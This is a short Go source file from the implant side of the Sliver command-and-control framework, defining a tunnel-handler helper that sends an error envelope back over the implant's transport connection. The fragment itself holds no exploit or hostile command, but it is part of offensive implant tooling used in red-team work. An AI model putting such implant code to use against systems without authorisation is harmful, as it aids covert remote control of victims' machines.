package tunnel_handlers

import (
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func reportError(envelope *sliverpb.Envelope, connection *transports.Connection, data []byte) {
	connection.Send <- &sliverpb.Envelope{
		Data: data,
		ID:   envelope.ID,
	}
}
